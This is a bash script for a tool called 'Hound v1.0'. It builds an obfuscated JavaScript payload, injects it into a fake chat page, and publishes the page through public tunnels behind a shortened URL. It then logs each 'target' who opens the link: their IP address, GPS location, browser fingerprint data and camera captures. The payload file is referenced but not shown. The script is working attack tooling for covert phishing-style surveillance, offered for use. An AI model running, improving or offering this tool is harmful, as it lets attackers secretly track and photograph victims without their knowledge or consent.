#!/bin/bash
# Hound v1.0
# Advanced Information Gathering Tool
# Powered by TechChip — Upgraded by AI
# Features: GPS, Camera Capture, Super Fingerprinting, Multi-Tunnel, URL Shortener

trap 'printf "\n";stop' 2

PORT=8080
TUNNEL_PID=""

banner() {
clear
printf '\n       ██   ██  ██████  ██    ██ ███    ██ ██████ \n' 
printf '       ██   ██ ██    ██ ██    ██ ████   ██ ██   ██ \n'
printf '       ███████ ██    ██ ██    ██ ██ ██  ██ ██   ██ \n'
printf '       ██   ██ ██    ██ ██    ██ ██  ██ ██ ██   ██ \n'
printf '       ██   ██  ██████   ██████  ██   ████ ██████  \n\n'
printf '\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'
printf " \e[1;93m      Hound v1.0 - by kypau\e[0m \n"
printf "\e[1;90m GPS | Camera | Fingerprint | Multi-Tunnel | URL Shortener\e[0m \n"
printf "\n"
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "[!] PHP is required. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "[!] curl is required. Install it. Aborting."; exit 1; }
}

stop() {
# Kill all background processes
for proc in cloudflared php ssh lt; do
    pkill -f "$proc" > /dev/null 2>&1
    killall "$proc" > /dev/null 2>&1
done
exit 1
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
cat ip.txt >> saved.ip.txt
}

shorten_url() {
local url="$1"
local short=""
# Try is.gd
short=$(curl -s "https://is.gd/create.php?format=simple&url=${url}" 2>/dev/null)
if [[ "$short" == http* ]]; then
    echo "$short"
    return
fi
# Fallback: return original
echo "$url"
}

checkfound() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
local last_capture_count=0
while true; do
    if [[ -e "ip.txt" ]]; then
        printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
        catch_ip
        rm -rf ip.txt
        printf "\n\e[1;93m--- Live Data Report (waiting for data...) ---\e[0m\n"
        # Show ALL data from beginning and keep following
        tail -f -n +1 data.txt &
        TAIL_PID=$!
        # Inner loop: monitor captures and new targets
        while true; do
            if [[ -d "captures" ]]; then
                local cur_count=$(ls captures/ 2>/dev/null | wc -l)
                if [[ $cur_count -gt $last_capture_count ]]; then
                    last_capture_count=$cur_count
                    printf "\n\e[1;95m[\e[0m+\e[1;95m] Captures updated: %s files in captures/ folder\e[0m\n" "$cur_count"
                fi
            fi
            if [[ -e "ip.txt" ]]; then
                kill $TAIL_PID 2>/dev/null
                printf "\n\e[1;92m[\e[0m+\e[1;92m] New target detected!\n"
                catch_ip
                rm -rf ip.txt
                cat data.txt >> targetreport.txt 2>/dev/null
                > data.txt
                printf "\n\e[1;93m--- New Target Data ---\e[0m\n"
                tail -f -n +1 data.txt &
                TAIL_PID=$!
            fi
            sleep 1
        done
    fi
    sleep 0.5
done
}

build_payload() {
printf "\e[1;92m[\e[0m+\e[1;92m] Building obfuscated payload...\n"
if [[ -f "obfuscate.sh" ]]; then
    bash obfuscate.sh 2>/dev/null
    if [[ -f "payload_obf.js" ]]; then
        printf "\e[1;92m[\e[0m+\e[1;92m] Payload obfuscated successfully.\n"
    else
        printf "\e[1;93m[\e[0m!\e[1;93m] Obfuscation failed, using raw payload.\n"
        echo "<script src='./payload.js'></script>" > payload_obf.js
    fi
else
    echo "<script src='./payload.js'></script>" > payload_obf.js
fi
}

build_html() {
# Inject payload into chat template
sed -e '/tc_payload/r payload_obf.js' index_chat.html > index.html
printf "\e[1;92m[\e[0m+\e[1;92m] index.html built with payload.\n"
}

display_link() {
local link="$1"
printf "\e[1;92m[\e[0m*\e[1;92m] Direct Link:\e[0m\e[1;77m %s\e[0m\n" "$link"

# Auto shorten
printf "\e[1;92m[\e[0m+\e[1;92m] Shortening URL...\n"
local short=$(shorten_url "$link")
if [[ "$short" != "$link" ]]; then
    printf "\e[1;92m[\e[0m*\e[1;92m] Short Link:\e[0m\e[1;77m %s\e[0m\n" "$short"
else
    printf "\e[1;93m[\e[0m!\e[1;93m] URL shortener unavailable, use direct link.\e[0m\n"
fi
}

# ==========================================
# TUNNEL METHODS
# ==========================================

cf_server() {
if [[ -e cloudflared ]]; then
    echo "Cloudflared already installed."
else
    command -v wget > /dev/null 2>&1 || { echo >&2 "[!] wget required for Cloudflared download."; exit 1; }
    printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
    arch=$(uname -m)
    arch2=$(uname -a | grep -o 'Android' | head -n1)
    if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]]; then
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
    elif [[ "$arch" == *'aarch64'* ]]; then
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
    elif [[ "$arch" == *'x86_64'* ]]; then
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
    else
        wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1
    fi
fi
chmod +x cloudflared
printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on port $PORT...\n"
php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting Cloudflared tunnel...\n"
rm -f cf.log
./cloudflared tunnel -url 127.0.0.1:$PORT --logfile cf.log > /dev/null 2>&1 &
sleep 10
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log")
if [[ -z "$link" ]]; then
    printf "\e[1;31m[!] Cloudflared tunnel failed to start.\e[0m\n"
    exit 1
fi
sed 's+forwarding_link+'$link'+g' template.php > index.php
display_link "$link"
checkfound
}

serveo_server() {
command -v ssh > /dev/null 2>&1 || { echo >&2 "[!] SSH is required for Serveo tunnel."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on port $PORT...\n"
php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting Serveo tunnel...\n"
rm -f serveo.log
ssh -o StrictHostKeyChecking=no -R 80:localhost:$PORT serveo.net > serveo.log 2>&1 &
TUNNEL_PID=$!
sleep 8
link=$(grep -o 'https://[a-z0-9]*\.serveo.net' serveo.log)
if [[ -z "$link" ]]; then
    printf "\e[1;31m[!] Serveo tunnel failed. Serveo may be down.\e[0m\n"
    printf "\e[1;93m[!] Try Cloudflared or LocalTunnel instead.\e[0m\n"
    exit 1
fi
sed 's+forwarding_link+'$link'+g' template.php > index.php
display_link "$link"
checkfound
}

lt_server() {
printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on port $PORT...\n"
php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting LocalTunnel...\n"
rm -f lt.log
npx -y localtunnel --port $PORT > lt.log 2>&1 &
TUNNEL_PID=$!
sleep 8
link=$(grep -o 'https://[a-z0-9\-]*\.loca.lt' lt.log)
if [[ -z "$link" ]]; then
    printf "\e[1;31m[!] LocalTunnel failed. Check npm/npx installation.\e[0m\n"
    exit 1
fi
sed 's+forwarding_link+'$link'+g' template.php > index.php
display_link "$link"
checkfound
}

local_server() {
sed 's+forwarding_link+''+g' template.php > index.php
printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on localhost:$PORT...\n"
php -S 127.0.0.1:$PORT > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m*\e[1;92m] Local Link:\e[0m\e[1;77m http://127.0.0.1:$PORT\e[0m\n"
printf "\e[1;93m[\e[0m!\e[1;93m] Note: Camera capture requires HTTPS. Use a tunnel for full features.\e[0m\n"
checkfound
}

# ==========================================
# MAIN
# ==========================================

hound() {
# Clean up old session
if [[ -e data.txt ]]; then
    cat data.txt >> targetreport.txt 2>/dev/null
    rm -rf data.txt
fi
touch data.txt
rm -rf ip.txt 2>/dev/null
mkdir -p captures

# Build payload
build_payload
build_html

# Tunnel selection menu
printf "\e[1;93m Select Tunnel Method:\e[0m\n"
printf "\e[1;92m [1]\e[0m Cloudflared (Recommended)\n"
printf "\e[1;92m [2]\e[0m Serveo (SSH tunnel)\n"
printf "\e[1;92m [3]\e[0m LocalTunnel (npm)\n"
printf "\e[1;92m [4]\e[0m Localhost only (no tunnel)\n"
printf "\n"
read -p $'\e[1;93m Choose [1-4] (default: 1): \e[0m' tunnel_choice
tunnel_choice="${tunnel_choice:-1}"

case $tunnel_choice in
    1) cf_server ;;
    2) serveo_server ;;
    3) lt_server ;;
    4) local_server ;;
    *) printf "\e[1;31m[!] Invalid option.\e[0m\n"; exit 1 ;;
esac
}

banner
dependencies
hound
